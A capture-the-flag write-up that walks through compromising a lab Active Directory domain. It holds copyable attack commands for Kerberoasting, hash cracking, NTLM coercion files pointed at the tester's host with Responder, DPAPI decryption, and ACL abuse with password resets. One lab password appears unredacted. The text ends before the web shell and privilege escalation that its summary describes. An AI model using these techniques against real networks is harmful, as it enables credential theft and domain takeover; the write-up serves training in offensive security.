# City Council | Writeups

### Scenario

#### Objective / Scope

A local municipality recently survived a devastating ransomware campaign. While their internal IT team believes the infection has been purged and the holes plugged, the Board of Supervisors isn't taking any chances. They’ve brought in **Hack Smarter** to provide a "second pair of eyes."

Your mission is to perform a comprehensive penetration test of the internal infrastructure. Reaching Domain Admin isn't the endgame; treat this like a real engagement. See how many vulnerabilities you're able to identify.

#### Initial Access

You have been provided with VPN access to their internal environment, but no other information.

### Summary

In City Council we assess a municipality's internal Active Directory environment following a recent ransomware incident. With only VPN access and no credentials, we begin by enumerating the exposed services on the domain controller. The host runs a full AD stack (DNS, Kerberos, LDAP/LDAPS, SMB, WinRM, RDP, IIS), confirming we are operating directly against `city.local`.

Web enumeration of the IIS portal reveals staff names and email patterns, which we leverage to generate username candidates. Kerberos username enumeration does not yield results, so we pivot to the downloadable Linux client application referenced on the website. Traffic analysis of the binary during execution exposes plaintext LDAP bind credentials for the service account `svc_services_portal`. Using these credentials, we authenticate to the domain and enumerate Active Directory with BloodHound.

Kerberoasting reveals a crackable TGS for `clerk.john`, granting us `READ`/`WRITE`access to the `Uploads` share. An internal email hints that NTLM authentication is used without prompting for passwords. We weaponize this by planting NTLM coercion files (created via `ntlm_theft`) on the writable share and capture the NTLMv2 hash of `jon.peters`, which we crack offline. BloodHound shows `jon.peters` has `GenericWrite` over multiple users, enabling Targeted Kerberoasting. We obtain and crack service tickets for `nina.soto` and `maria.clerk`.

Access as `nina.soto` grants read access to the `Backups` share, where we discover WIM user profile backups. Extracting them reveals emails and DPAPI-protected Credential Manager blobs. Using Impacket's `dpapi.py` with `clerk.john`'s credentials, we decrypt stored credentials and recover the password for `emma.hayes` from Helpdesk.

BloodHound analysis shows `emma.hayes` has `WriteDacl` and `GenericWrite` over key OUs and users. We grant ourselves `GenericAll` over the `CityOps` OU, reset and enable the `sam.brooks` account a Remote Management Users member, and gain a WinRM foothold. From there, we pivot to the quarantined `web_admin` account by moving it into the `CityOps` OU (leveraging `GenericWrite` over Quarantine and `GenericAll` over CityOps), reset its password, and execute a reverse shell via `RunasCs`.

As `web_admin`, we upload an ASPX web shell to IIS and gain execution as `iis apppool\defaultapppool`. The account holds `SeImpersonatePrivilege`, allowing us to `NT AUTHORITY\SYSTEM` a system shell by compiling and executing an EfsPotato exploit. This yields completing full domain controller compromise. We retrieve the final flag from the Administrator profile.

### Recon

We use `rustscan -b 500 -a 10.1.90.188 -- -sC -sV -Pn` to enumerate all TCP ports on the target machine, piping the discovered results into Nmap which runs default NSE scripts `-sC`, service and version detection `-sV`, and treats the host as online without ICMP echo `-Pn`.

A batch size of `500` trades speed for stability, the default `1500` balances both, while much larger sizes increase throughput but risk missed responses and instability.

```bash
rustscan -b 500 -a 10.1.90.188 --top -- -sC -sV -Pn
```

![](<../../../.gitbook/assets/image (138)>)

The target machine is actually a domain controller with exposed services including DNS `53`, Kerberos `88/464`, an `IIS /10.0` web server on port `80`, multiple MSRPC endpoints `135, 593, 49664+`, SMB `139/445`, LDAP and LDAPS `389/636/3268/3269` tied to Active Directory, RDP `3389`, WinRM on `5985`, and .NET Remoting `9389`. This indicates a fully integrated Windows AD environment where LDAP/LDAPS and Kerberos provide authentication, SMB and RPC enable remote management, and RDP/WinRM serve as remote access points.

![](<../../../.gitbook/assets/image (139)>)

![](<../../../.gitbook/assets/image (140)>)

#### WEB

For now, we'll continue and take a look at the website hosted via the IIS.

The site promotes a digital service portal to access various city government services such as permits, licenses, and service requests.

```
http://10.1.90.188
```

![](<../../../.gitbook/assets/image (141)>)

We browse through the website and discover a team of four people in the lower third. From this information, we can identify the first and last names as well as the email addresses of each individual team member.

![](<../../../.gitbook/assets/image (142)>)

We note down the names for possible later creation of a word list and username enumeration.

`users.txt`

```
emma hayes
jon peters
rita cho
nina soto
```

In the footer, we discover further links, including `Documents & Forms`.

![](<../../../.gitbook/assets/image (143)>)

In the footer, we discover further links, including Documents & Forms. Here we can download a Windows or Linux application to access various city government services.

```
http://10.1.90.188/documents-forms.html
```

![](<../../../.gitbook/assets/image (144)>)

Furthermore, we find instructions on how to use the applications, such as dependencies or entries that must be made in `/etc/hosts`. Here, we can already directly adopt the `/etc/hosts` entry. The entries required correspond to the domain we discovered from the Nmap scan.

![](<../../../.gitbook/assets/image (145)>)

#### SMB

Before we dive in with username enumeration we try to authenticate as `guest` and anonymously against SMB, but without success - the account is disabled. Nevertheless we could generate the hosts file entry like the following:

```bash
nxc smb 10.1.90.188 -u guest -p '' --generate-hosts-file hosts
```

![](<../../../.gitbook/assets/image (146)>)

If not already done, we add the following line to our `/etc/host entry`:

```
10.1.90.188 DC-CC.city.local city.local DC-CC
```

#### LDAP

Since we have a list of first and last names, no valid usernames yet and no access, we create a username word list from this using username anarchy and use this resulting list to enumerate possible usernames using kerbrute.

[https://orange-cyberdefense.github.io/ocd-mindmaps/img/mindmap\_ad\_dark\_classic\_2025.03.excalidraw.svg](https://orange-cyberdefense.github.io/ocd-mindmaps/img/mindmap_ad_dark_classic_2025.03.excalidraw.svg)

![](<../../../.gitbook/assets/image (147)>)

We create a username wordlist using Username Anarchy:

[GitHub - urbanadventurer/username-anarchy: Username tools for penetration testing](https://github.com/urbanadventurer/username-anarchy)

```bash
username-anarchy -i users.txt > usernames.txt
```

![](<../../../.gitbook/assets/image (148)>)

Next we pass the list to Kerbrute, but we are not able to identify any valid users:

[GitHub - ropnop/kerbrute: A tool to perform Kerberos pre-auth bruteforcing](https://github.com/ropnop/kerbrute)

```bash
kerbrute userenum -d city.local --dc DC-DC usernames.txt
```

![](<../../../.gitbook/assets/image (149)>)

#### Binaries

We continue with the binaries. I decided to take a closer look at the Linux binary. For this part, I had to switch to an amd64 machine. It turns out that the reversing is not so straightforward. And we could find out more by executing the binary, if necessary.

If not already done, we add the following line to our `/etc/host entry`:

```
10.1.90.188 DC-CC.city.local city.local DC-CC
```

We download the binary and make it executable.

![](<../../../.gitbook/assets/image (150)>)

Next, we run the binary.

![](<../../../.gitbook/assets/image (151)>)

### Access as svc\_services\_portal

We can fill out and submit different forms for inquiries. For testing purposes, we use the `Building Permit Request` form, as it is already neatly pre-filled. We submit an application and see the `Application Status Log` building up.

We see that a connection to the City Council Directory Services is being established. The `svc_services_portal` account is used and authenticated by means of an LDAP bind request. It is possible that credentials are stored in the binary and are transferred during the connection establishment.

![](<../../../.gitbook/assets/image (152)>)

After a short time, we see that our request has been processed.

![](<../../../.gitbook/assets/image (153)>)

We start Wireshark, select `tun0` in our case, and capture the traffic. We send another request.

After a short time, we see the bind request, which contains the user `svc_services_portal` and the corresponding password in a packet.

![](<../../../.gitbook/assets/image (154)>)

If we follow the TCP request, it is easier to read.

![](<../../../.gitbook/assets/image (155)>)

We test the credentials using NetExec on SMB. We successfully authenticated. In addition to the standard shares, we discover the `Uploads` and `Backups` share. However, as this user, we do not have access to these; we cannot access them for reading or writing. As this user, we cannot access the system via RDP or WinRM.

```bash
nxc smb city.local -u svc_services_portal -p 'REDACTED'  --shares
```

![](<../../../.gitbook/assets/image (156)>)

### BloodHound Enumeration I

With the credentials, we can now also enumerate the AD using BloodHound.

```bash
bloodhound-ce.py --zip -c All -d city.local -u svc_services_portal -p 'REDACTED' -dc DC-CC.city.local -ns 10.1.90.188
```

![](<../../../.gitbook/assets/image (157)>)

We first look at our compromised user and initially do not find any special permissions or groups. This confirms why we were unable to access the machine via RDP or WinRM. The user is not in any of the required groups.

![](<../../../.gitbook/assets/image (158)>)

We are able to identify `Administrator` as one of the Domain Admins.

![](<../../../.gitbook/assets/image (159)>)

However, we can detect Kerberos-enabled users. This is the user `clerk.john`. With the valid credentials we could have try Kerberoasting also blindly.

We also cannot find any other special groups or permissions from `clerk.john`. Our hope now is that we can extract a TGS blob from `clerk.john` using kerberoasting and then crack it offline. With access as `clerk.john`, we could maybe then gain access to one of the shares and thus extend our privileges if they contained sensitive loot.

![](<../../../.gitbook/assets/image (160)>)

### Access as clerk.john

We use NetExec for kerberoasting and obtain the TGS blob from `clerk.john`.

[Kerberoast | The Hacker Recipes](https://www.thehacker.recipes/ad/movement/kerberos/kerberoast#practice)

> When asking the KDC (Key Distribution Center) for a Service Ticket (ST), the requesting user needs to send a valid TGT (Ticket Granting Ticket) and the service name (`sname`) of the service wanted. If the TGT is valid, and if the service exists, the KDC sends the ST to the requesting user.
>
> Multiple formats are accepted for the `sname` field: servicePrincipalName (SPN), sAMAccountName (SAN), userPrincipalName (UPN), etc. (see [Kerberos tickets](https://www.thehacker.recipes/ad/movement/kerberos/#tickets) "cname formats").
>
> The ST is encrypted with the requested service account's NT hash. If an attacker has a valid TGT and knows a service (by its SAN or SPN), he can request a ST for this service and crack it offline later in an attempt to retrieve that service account's password.
>
> In most situations, services accounts are machine accounts, which have very complex, long, and random passwords. But if a service account, with a human-defined password, has a SPN set, attackers can request a ST for this service and attempt to crack it offline. **This is Kerberoasting**.

[https://orange-cyberdefense.github.io/ocd-mindmaps/img/mindmap\_ad\_dark\_classic\_2025.03.excalidraw.svg](https://orange-cyberdefense.github.io/ocd-mindmaps/img/mindmap_ad_dark_classic_2025.03.excalidraw.svg)

![](<../../../.gitbook/assets/image (161)>)

```bash
nxc ldap city.local -u svc_services_portal -p 'REDACTED' --kerberoasting output.txt
```

![](<../../../.gitbook/assets/image (162)>)

Next, we try to crack the hash using the wordlist rockyou.txt and are able to retrieve the password of `john.clerk`.

```bash
hashcat -a0 -m13100 output.txt /usr/share/wordlists/rockyou.txt
```

![](<../../../.gitbook/assets/image (163)>)

We test the credentials using NetExec on SMB. We successfully authenticated. And we do have actually `READ` and `WRITE` permission to the `Uploads` share.

```bash
nxc smb city.local -u clerk.john -p 'REDACTED' --shares
```

![](<../../../.gitbook/assets/image (164)>)

### Access as jon.peters

We connect to the share using `smbclient.py`. Here we find various documents, we download the entire content via `mget *`.

```bash
smbclient.py city.local/clerk.john:'REDACTED'@10.1.90.188
```

![](<../../../.gitbook/assets/image (165)>)

An email is among the files from `Emma Hayes` and `Jon Peters`. Here, the IT help desk provides instructions on how to use and integrate a share, the `Uploads` share, to which we also have `READ` and `WRITE` access. It is noted that NTLM is used for authentication and that a password entry is not necessary. This email seems to be a subtle hint that we, as attackers, should use the write permission to steal NTLM hashes. This is possible if we place a file on the share that references a remote resource under our control. When a user or service accesses this file, the system will automatically attempt to authenticate to the remote SMB share using NTLM, causing the NTLM challenge-response to be sent to our listener. By capturing this authentication attempt with a tool like `Responder`, we can obtain the NTLM hash.

![](<../../../.gitbook/assets/image (166)>)

`WriteAccess_Jon.Peters_DC-CC-Uploads.eml`

```
Subject: Write access to \DC-CC\Uploads has been granted

From: Emma Hayes emma.hayes@city.local

To: Jon Peters jon.peters@city.local

Date: Fri, 24 Oct 2025 10:42:00 +0100

Hi Jon,

Quick note: I’ve granted you write access to the shared folder \\DC-CC\Uploads. The folder is mapped as drive Z: on your workstation — you should be able to create, edit and upload files there.

The following files are already in the Uploads folder and appear to be actively edited by you:

Staff_Contacts.txt

If the drive does not connect automatically, you can map it manually (you will be prompted for your domain credentials):

net use Z: \\DC-CC\Uploads /user:city.local\jon.peters

Please note: the share uses NTLM authentication. If you connect from an unfamiliar or public device and see an authentication prompt, do not enter your credentials on that device — contact the IT Helpdesk so we can verify the endpoint before you proceed.

If you encounter any issues saving files or if the mapping does not persist after reboot, let me know and I’ll check the mapping remotely.

Best regards,
Emma Hayes
IT Helpdesk – City Council
```

The Greenwolf `ntlm_theft` tool may help us out here. With that we are able to create up to 21 files that can be used for NTLM hash theft.

[GitHub - Greenwolf/ntlm\_theft: A tool for generating multiple types of NTLMv2 hash theft files by Jacob Wilkin (Greenwolf)](https://github.com/Greenwolf/ntlm_theft)

Alternatively, the hashgrab tool is also very reliable for generating such files, which connect to our server when called up for rendering:

[GitHub - xct/hashgrab: generate payloads that force authentication against an attacker machine](https://github.com/xct/hashgrab)

We generate the files...

```bash
ntlm_theft.py --generate modern --server 10.200.37.204 --filename 'note'
```

![](<../../../.gitbook/assets/image (167)>)

... spin up responder...

```bash
sudo responder -I tun0
```

![](<../../../.gitbook/assets/image (168)>)

... and connect to the share again using `smbclient.py`. We put the resulting `.lnk` file from `ntlm_theft.py` into the share and wait some time.

```bash
smbclient.py city.local/clerk.john:'REDACTED'@10.1.90.188
```

![](<../../../.gitbook/assets/image (169)>)

After a short duration we receive the NTLMv2-SSP of `jon.peters`.

![](<../../../.gitbook/assets/image (170)>)

We try to crack the hash and are successful.

```bash
hashcat -a0 -m5600 NTLMv2-SSP-jon.peters /usr/share/wordlists/rockyou.txt
```

![](<../../../.gitbook/assets/image (171)>)

We test the credentials using NetExec on SMB. We successfully authenticated. However, we only have access to the `Uploads` share, which we have already successfully enumerated and exploited. So we need to go back to the drawing board. Let's look at our BloodHound data to see what the user can do.

```bash
nxc smb city.local -u jon.peters -p 'REDACTED' --shares
```

![](<../../../.gitbook/assets/image (172)>)

### BloodHound Enumeration I

We see that the user jon.peters has GenericWrite permissions over three users. Those are `paul.roberts`, `maria.clerk` and `nina.soto`. his allows either a TargetedKerberoast or Shadow Credentials Atttack.

![](<../../../.gitbook/assets/image (173)>)

### Access as nina.soto & maria.clark

We will first attempt a TargetedKerberoast attack.

[Targeted Kerberoasting | The Hacker Recipes](https://www.thehacker.recipes/ad/movement/dacl/targeted-kerberoasting#targeted-kerberoasting)

> This abuse can be carried out when controlling an object that has a `GenericAll`, `GenericWrite`, `WriteProperty` or `Validated-SPN` over the target. A member of the [Account Operator](https://www.thehacker.recipes/ad/movement/builtins/security-groups) group usually has those permissions.
>
> The attacker can add an SPN (`ServicePrincipalName`) to that account. Once the account has an SPN, it becomes vulnerable to [Kerberoasting](https://www.thehacker.recipes/ad/movement/kerberos/kerberoast). This technique is called Targeted Kerberoasting.

[https://orange-cyberdefense.github.io/ocd-mindmaps/img/mindmap\_ad\_dark\_classic\_2025.03.excalidraw.svg](https://orange-cyberdefense.github.io/ocd-mindmaps/img/mindmap_ad_dark_classic_2025.03.excalidraw.svg)

![](<../../../.gitbook/assets/image (174)>)

[GitHub - ShutdownRepo/targetedKerberoast: Kerberoast with ACL abuse capabilities](https://github.com/ShutdownRepo/targetedKerberoast)

We receive the TGS blobs from all four users:

```bash
targetedKerberoast.py -d 'city.local' -u 'jon.peters' -p 'REDACTED' --dc-ip 10.1.90.188
```

![](<../../../.gitbook/assets/image (175)>)

And can crack the blobs from `nina.soto` and `maria.clerk`.

```bash
hashcat -a0 -m13100 targetdKerberoastHashes.txt /usr/share/wordlists/rockyou.txt
```

![](<../../../.gitbook/assets/image (176)>)

We test the credentials again using NetExec via SMB. We are able to authenticate successfully and see at `nina.soto` that we now have read access to the share `Backups`.

```bash
nxc smb city.local -u nina.soto -p 'REDACTED' --shares
```

![](<../../../.gitbook/assets/image (177)>)

### Acces as emma.hayes

We connect to the share using smbclient.py and discover two subfolders: `Documents Backup` and `UserProfileBackups`. We download all contents of both files using `mget *`. The UserProfileBackups share contains two WIM files corresponding to the users `clerk.john` and `sam.brooks`.

Windws Imaging Format files are disk image files used by **Windows** to store a complete Windows installation or system deployment image. They allow multiple system images to be stored in one file.

The WIM file from `clerk.john` is somewhat larger and therefore takes a little longer to download successfully. Both files are required.

```bash
smbclient.py city.local/nina.soto:'REDACTED'@10.1.90.188
```

![](<../../../.gitbook/assets/image (178)>)

To extract the contents, we use `wimextract` from the `wimtools` suite, which can be easily installed using `apt install wimtools`, for example.

We create a folder for the contents of the image...

```bash
mkdir sam_brooks
```

... and extract them into this folder as follows.

```bash
wimextract sam.brooks_ProfileBackup_0728.wim 1 --dest-dir=./sam_brooks
```

![](<../../../.gitbook/assets/image (179)>)

We look at the folder structure using `tree`...

![](<../../../.gitbook/assets/image (180)>)

and spot a `message_sam.eml` email file in the users `Desktop`.

![](<../../../.gitbook/assets/image (181)>)

From the email, we can gather that the `web_admin` account was moved to the `Quarantine OU` due to security concerns related to system activity. This was done because the web server allows ASP.NET `.aspx` uploads, which could potentially be abused with that account to escalate privileges or perform unauthorized actions.

That's interesting, we'll keep that information in mind. We may need the `web_admin` account later to exploit this and place an ASPX web/reverse shell to extend our privileges.

```bash
cat message_sam.eml
```

![](<../../../.gitbook/assets/image (182)>)

`message_sam.eml`

```
Subject: Notice: web_admin account moved to Quarantine OU

Hi Sam,

This is to inform you that the web_admin account has been moved to the Quarantine OU following security concerns identified during recent system activity.
The web server has ASP.NET enabled and file uploads of .aspx pages are possible; in combination with the web_admin account this creates a scenario could be used to escalate privileges or perform unauthorized actions.

No production impact has been confirmed, but the account has been isolated for forensic review as a precautionary measure.

If you require any temporary access or need updates regarding the investigation, please contact Emma Hayes (Helpdesk) at emma.hayes for coordination and approval.

Regards,
Administrator
IT Operations

(Ref: CHGWEBA
```

We continue and extract the contents from `clerk.john_ProfileBackup_0729.wim`. We create a folder and continue in the same way as for `sam_brooks`.

```bash
mkdir clerk_john
```

```bash
wimextract clerk.john_ProfileBackup_0729.wim 1 --dest-dir=./clerk_john
```

![](<../../../.gitbook/assets/image (183)>)

Here, too, we look at the folder structure and its contents using `tree`.

![](<../../../.gitbook/assets/image (184)>)

And we also found an email here on the desktop

![](<../../../.gitbook/assets/image (185)>)

From the mail we can extract that `Emma Hayes` informs John that he can temporarily use her account while she is on vacation to handle urgent IT tasks, and the credentials will be shared via an approved channel. She instructs him to store them in Windows Credential Manager protected by DPAPI.

```bash
cat 2025-10-30-Emma-Hayes_to_Clerk-John_Temporary-Access_DPAPI.eml
```

![](<../../../.gitbook/assets/image (186)>)

```
Subject: Temporary access while I’m on vacation

Hi John,

Quick heads-up: while I’m on vacation, you may use my account to handle urgent IT tasks.

Credentials
I’ll share the credentials with you via our approved channel. Please store them in Windows Credential Manager (Control Panel → User Accounts → Credential Manager → Windows Credentials → Add a Windows credential) and use them from there.

DPAPI note (why Credential Manager):
Windows Credential Manager protects saved credentials with DPAPI—they’re encrypted to your user profile (and this machine), so the password isn’t stored in plaintext. Still, treat it as sensitive: accounts with LOCAL SYSTEM / domain admin privileges can technically recover DPAPI-protected secrets, so only use it on trusted machines and profiles, and never export or sync these creds.

When I’m back
On my return, please remove the stored credential from Credential Manager. As discussed, your temporary membership in the “Remote Management” group will be revoked after my vacation.

Security reminders

Use the account only for work-related actions you’d normally escalate to IT.

Don’t save the password anywhere else or forward it.

Log off when finished and avoid keeping interactive sessions open.

Thanks for covering!

Best,
Emma Hayes
Helpdesk / IT Support
emma.hayes@city.local
```

![](<../../../.gitbook/assets/image (187)>)

We identify the Credential Manager blob and the corresponding DPAPI masterkey in the user's profile directories of the extracted image.

Credential Manager blob:

```
AppData/Roaming/Microsoft/Credentials/03128079C6E14F37F5AEBDD69E344291
```

![](<../../../.gitbook/assets/image (188)>)

Master Key file:

```
AppData/Roaming/Microsoft/Protect/S-1-5-21-407732331-1521580060-1819249925-1103/de222e76-cb5d-418f-a1c2-7e4e9dfe29e1
```

![](<../../../.gitbook/assets/image (189)>)

We extract the masterkey using `dpapi.py masterkey` with John's SID and password.

```bash
dpapi.py masterkey -file clerk_john/AppData/Roaming/Microsoft/Protect/S-1-5-21-407732331-1521580060-1819249925-1103/de222e76-cb5d-418f-a1c2-7e4e9dfe29e1 -sid S-1-5-21-407732331-1521580060-1819249925-1103 -password REDACTED
```

![](<../../../.gitbook/assets/image (190)>)

Next, we use that key with `dpapi.py credential` (a tool by impacket) to decrypt the stored credential file and extract the password of `emma.hayes`.

```bash
dpapi.py credential -file clerk_john/AppData/Roaming/Microsoft/Credentials/03128079C6E14F37F5AEBDD69E344291 -key REDACTED
```

![](<../../../.gitbook/assets/image (191)>)

We test the credentials using NetExec on SMB. We successfully authenticated.

![](https://0xb0b.gitbook.io/writeups/~gitbook/image?url=https%3A%2F%2F2148487935-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FoaqaFccsCrwKo1CHmLRKW%252Fuploads%252FtDk1ZLpUV8iaWn7420y3%252Fgrafik.png%3Falt%3Dmedia%26token%3D14bbaa9a-84ff-4b4e-a196-7414a6172c13\&width=768\&dpr=3\&quality=100\&sign=96cb2be2\&sv=2)

We could also retrieve the password of emma.hayes from the command line powershell history of clerk.john from

`AppData/Roaming/Microsoft/Windows/PowerShell/PSReadLineConsoleHost_history.txt`

### BloodHound Enumeration III

We see that `emma.hayes` is in the helpdesk group.

![](<../../../.gitbook/assets/image (192)>)

Furthermore, the user has `GenericWrite` permissions over the `quarantine` OU and `WriteDacl` permissions over the `citypos` OU. The user also has `GenericWrite` permissions over the `web_admin` user. (Remember, we may need this to compromise the user in the context of the running web application).

In addition to these, this user also has `WriteDacl` permissions for `rita.cho`, `alex.king`, and `sam.brooks`.

* **Quarantine OU (GenericWrite):** Allows us to modify attributes of the OU, such as adding or modifying objects inside it (e.g., moving users or changing settings).
* **citypos OU (WriteDacl):** Allows us to change the OU's permissions (ACL), potentially granting ourselves or others full control over objects within that OU.
* **web\_admin user (GenericWrite):** Allows us to modify the user’s attributes, such as changing the logon script, or adding SPNs for Kerberos abuse.
* **rita.cho, alex.king, sam.brooks (WriteDacl):** Allows us to modify their ACLs, enabling us to grant ourselves rights like **FullControl** or **ResetPassword** over those accounts.

![](<../../../.gitbook/assets/image (193)>)

We see that `rita.cho`, `alex.king`, and `sam.brooks` are part of OU `cityops`.

This means that if we granted ourselves the `GenericAll` permission over the cityops OU via `WriteDacl`, we would also have access to the users inside the OU, granting us `GenericAll` over them. This would allow us to reset their passwords and compromise those accounts.

![](<../../../.gitbook/assets/image (194)>)

As in the previously discovered email from images, we can confirm that `web_admin` is part of quarantine.

![](<../../../.gitbook/assets/image (195)>)

We also discover that `sam.brooks` is part of the `remote management users` group. We can therefore establish our initial foothold through that account.

So, we will primarily link our potential attack vectors to obtain an interactive session through `sam.brooks`.

We will use `WriteDacl` to grant `GenericAll` permissions over the cityops OU and then change `sam.brooks`' password.

![](<../../../.gitbook/assets/image (196)>)

### Shell as sam.brooks

We grant `GenericAll` rights over the `CityOps` OU, giving us full control over the object and its members, which allows actions such as resetting the passwords of users within that OU.

```bash
bloodyAD --host DC-CC.city.local -d city.local -u emma.hayes -p 'REDACTED' add genericAll 'OU=CityOps,DC=city,DC=local' 'emma.hayes'
```

![](<../../../.gitbook/assets/image (197)>)

Next, we reset the password of the user `sam.brooks`, which is possible because our `GenericAll` rights over the CityOps OU give us control over its member accounts.

```bash
bloodyAD -u emma.hayes -p 'REDACTED' -d 'city.local' --host 10.1.90.188 set password 'sam.brooks' 'Pwned123@!'
```

We test access using NetExec, but the account is disabled, something I have overlooked in the BloodHound data; however, since we have `GenericAll`, we can simply enable the account.

![](https://0xb0b.gitbook.io/writeups/~gitbook/image?url=https%3A%2F%2F2148487935-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252F2148487935-files.gitbook.io%252F~%252Ffiles%252Fv0%252Fb%252Fgitbook-x-prod.appspot.com%252Fo%252Fspaces%252FoqaFccsCrwKo1CHmLRKW%252Fuploads%252F7uEnTYmCF69nPa2nrMbN%252Fgrafik.png%3Falt%3Dmedia%26token%3D83bddf6a-5764-4f48-b4b4-68eef9a0b51e\&width=768\&dpr=3\&quality=100\&sign=8ef84f38\&sv=2)

```bash
nxc smb city.local -u sam.brooks -p 'Pwned123@!' --shares
```

![](https://0xb0b.gitbook.io/writeups/~gitbook/image?url=https%3A%2F%2F2148487935-files.gitbook.io%2F%7E%2Ffiles%252Fv0%252Fb%252Fgitbook-x-prod.appspot.com%252Fo%252Fspaces%252FoqaFccsCrwKo1CHmLRKW%252Fuploads%252FtNbt7sJlHfT8mTN0L6BG%252Fgrafik.png%3Falt%3Dmedia%26token%3Dda8d001e-c6cf-4309-8b0e-055552c5a1f1\&width=768\&dpr=3\&quality=100\&sign=cf63d9a3\&sv=2)

We then enable the `sam.brooks` account by removing the `ACCOUNTDISABLE` flag from the UserAccountControl attribute using bloodyAD.

```bash
bloodyAD --host DC-CC.city.local -d city.local -u emma.hayes -p 'REDACTED' remove uac 'sam.brooks' -f ACCOUNTDISABLE
```

![](https://0xb0b.gitbook.io/writeups/~gitbook/image?url=https%3A%2F%2F2148487935-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FoaqaFccsCrwKo1CHmLRKW%252Fuploads%252F3VUyTRWLWcPVuEpmKTDZ%252Fgrafik.png%3Falt%3Dmedia%26token%3D220948d4-0d5d-4446-be9e-007e8e82c9b2\&width=768\&dpr=3\&quality=100\&sign=7c140d1a\&sv=2)

We test again with NetExec and can now successfully authenticate with the enabled account.

```bash
nxc smb city.local -u sam.brooks -p 'Pwned123@!' --shares
```

![](https://0xb0b.gitbook.io/writeups/~gitbook/image?url=https%3A%2F%2F2148487935-files.gitbook.io%2F%7E%2Ffiles%252Fv0%252Fb%252Fgitbook-x-prod.appspot.com%252Fo%252Fspaces%252FoqaFccsCrwKo1CHmLRKW%252Fuploads%252FtNbt7sJlHfT8mTN0L6BG%252Fgrafik.png%3Falt%3Dmedia%26token%3Dda8d001e-c6cf-4309-8b0e-055552c5a1f1\&width=768\&dpr=3\&quality=100\&sign=cf63d9a3\&sv=2)

Next we establish a remote PowerShell session using WinRM with the compromised and find the users flag in the Desktop folder of `sam.brooks`.

```bash
evil-winrm -i DC-CC.city.local -u sam.brooks -p 'Pwned123@!'
```

![](https://0xb0b.gitbook.io/writeups/~gitbook/image?url=https%3A%2F%2F2148487935-files.gitbook.io%2F%7E%2Ffiles%252Fv0%252Fb%252Fgitbook-x-prod.appspot.com%252Fo%252Fspaces%252FoqaFccsCrwKo1CHmLRKW%252Fuploads%252FBg2Hs9wvLwBlxVmf3GoN%252Fgrafik.png%3Falt%3Dmedia%26token%3Dc691233a-e337-4df2-8866-e251c07e56a0\&width=768\&dpr=3\&quality=100\&sign=98e9b715\&sv=2)

### Shell as web\_admin

In our session as `sam.brooks`, we try to write to the `/inetpub/wwwroot` directory but are unsuccessful. We lack the permissions; we cannot place an aspx shell here, for now. So, as expected, we will need the `web_admin` account.

![](https://0xb0b.gitbook.io/writeups/~gitbook/image?url=https%3A%2F%2F2148487935-files.gitbook.io%2F%7E%2Ffiles%252Fv0%252Fb%252Fgitbook-x-prod.appspot.com%252Fo%252Fspaces%252FoqaFccsCrwKo1CHmLRKW%252Fuploads%252FURLFo170we1ht108SR2i%252Fgrafik.png%3Falt%3Dmedia%26token%3Dd00f6736-44d3-4e8d-85cf-257f792f6cf3\&width=768\&dpr=3\&quality=100\&sign=8e910194\&sv=2)

The hashes obtained through targeted Kerberoasting were not crackable, and the Shadow Credentials attack was also unsuccessful.

Both ways are depicted here in a similar fashion:

[Arasaka | Writeups](https://0xb0b.gitbook.io/writeups/hack-smarter-labs/2025/arasaka#access-as-soulkiller.svc)

Instead, we try to leverage our privileges by moving the `web_admin` account into the `CityOps` OU, where we previously granted ourselves `GenericAll`, allowing us to reset the `web_admin` password and take control of the account.

We prepare an LDIF file to move the `web_admin` user object from the `Quarantine` OU to the `CityOps` OU.

```bash
cat <<EOF > move.ldif
dn: CN=Web Admin,OU=Quarantine,DC=city,DC=local
changetype: moddn
newrdn: CN=Web Admin
deleteoldrdn: 1
newsuperior: OU=CityOps,DC=city,DC=local
EOF
```

Next, we execute the LDAP modification to move the `web_admin` account from the `Quarantine` OU to the `CityOps` OU, placing it in a location where we have `GenericAll` control.

```bash
ldapmodify -H ldap://DC-CC.city.local \
-D 'emma.hayes@city.local' \
-w 'REDACTED' \
-f move.ldif
```

![](https://0xb0b.gitbook.io/writeups/~gitbook/image?url=https%3A%2F%2F2148487935-files.gitbook.io%2F%7E%2Ffiles%252Fv0%252Fb%252Fgitbook-x-prod.appspot.com%252Fo%252Fspaces%252FoqaFccsCrwKo1CHmLRKW%252Fuploads%252FrHWBWpAQIEgPCifu7kDP%252Fgrafik.png%3Falt%3Dmedia%26token%3Dee71f8cd-e3c6-4067-93d8-8fb1b913b42a\&width=768\&dpr=3\&quality=100\&sign=655e9dd0\&sv=2)

After moving the account to the `CityOps` OU, we leverage our `GenericAll` privileges over that OU to reset the password of the `web_admin` user, allowing us to take control of the account.

```bash
bloodyAD -u emma.hayes -p '!Gemma4James!' -d 'city.local' --host 10.1.90.188 set password 'web_admin' 'Pwned123@!'
```

![](https://0xb0b.gitbook.io/writeups/~gitbook/image?url=https%3A%2F%2F2148487935-files.gitbook.io%2F%7E%2Ffiles%252Fv0%252Fb%252Fgitbook-x-prod.appspot.com%252Fo%252Fspaces%252FoqaFccsCrwKo1CHmLRKW%252Fuploads%252FzFfTJduqOB2cnK71OFI2%252Fgrafik.png%3Falt%3Dmedia%26token%3Daa68b447-e614-49b5-a08a-80993d27ae25\&width=768\&dpr=3\&quality=100\&sign=b82b7cf\&sv=2)

Next we verify the new credentials using NetExec, and we can successfully authenticate as `web_admin`.

```bash
nxc smb city.local -u web_admin -p 'Pwned123@!' --shares
```

![](https://0xb0b.gitbook.io/writeups/~gitbook/image?url=https%3A%2F%2F2148487935-files.gitbook.io%2F%7E%2Ffiles%252Fv0%252Fb%252Fgitbook-x-prod.appspot.com%252Fo%252Fspaces%252FoqaFccsCrwKo1CHmLRKW%252Fuploads%252Freh5FFPF55Kyc1VoJrQg%252Fgrafik.png%3Falt%3Dmedia%26token%3Dc06d1060-e68d-4cd1-9c9b-7fb31303710d\&width=768\&dpr=3\&quality=100\&sign=3cdd9c64\&sv=2)

Unfortunately, the user is not part of the `Windows Remote Management Users` group or the `Remote Desktop Users` group. Therefore, we cannot conveniently establish an interactive session.

